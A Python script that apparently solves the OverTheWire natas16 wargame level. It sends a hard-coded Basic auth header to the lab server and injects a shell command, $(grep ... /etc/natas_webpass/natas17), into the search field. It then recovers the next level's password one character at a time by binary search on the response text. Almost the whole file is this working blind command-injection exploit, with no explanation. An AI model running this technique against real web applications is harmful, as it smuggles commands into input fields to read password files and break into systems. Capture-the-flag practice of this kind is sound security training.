import requests


def check(response):
    if 'African' in response:
        return False
    return True

def split(s):
    half, rem = divmod(len(s), 2)
    return s[:half + rem], s[half + rem:]

url = "http://natas16.natas.labs.overthewire.org/"


payload = ""
headers = {
    'Authorization': "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==",
    }






letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
password = ""


for i in range(32):
    l = letters
    while (True):
        f, s = split(l)

        needle = "African$(grep -G ^"+password+"["+f+"]"+" /etc/natas_webpass/natas17)" 
        querystring = {"needle":needle,"submit":"Search"}
        response = requests.request("GET", url, data=payload, headers=headers, params=querystring)

        if check(response.text):
            l = f
        else:
            l = s
        
        print(password+l)
        if len(l) == 1:
            password += l
            break

print(password)
